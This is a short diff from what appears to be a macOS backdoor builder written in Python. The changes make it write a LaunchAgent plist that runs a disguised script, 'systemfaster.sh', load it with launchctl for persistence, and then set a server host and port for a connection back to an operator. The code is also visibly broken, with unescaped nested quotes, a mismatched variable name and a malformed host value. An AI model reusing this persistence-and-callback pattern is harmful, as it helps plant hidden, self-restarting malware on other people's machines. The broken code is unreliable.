@@ -21,14 +21,14 @@ daemon = ("<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
     <key>ProgramArguments</key>
     <array>
         <string>/bin/bash</string>
-        <string>absolute_path_to_script</string>
+        <string>{p}/systemfaster.sh</string>
 
     </array>
 </dict>
 </plist>")
 with open("com.example.exampld.plist", "w") as python_script_file:
     python_script_file.write(l)
-os.system("Library/LaunchAgents/com.example.exampld.plist")
+os.system("launchctl load Library/LaunchAgents/com.example.exampld.plist")
 SERVER_HOST = {a+ip+a}
 SERVER_PORT = {port}
 BUFFER_SIZE = 1024")
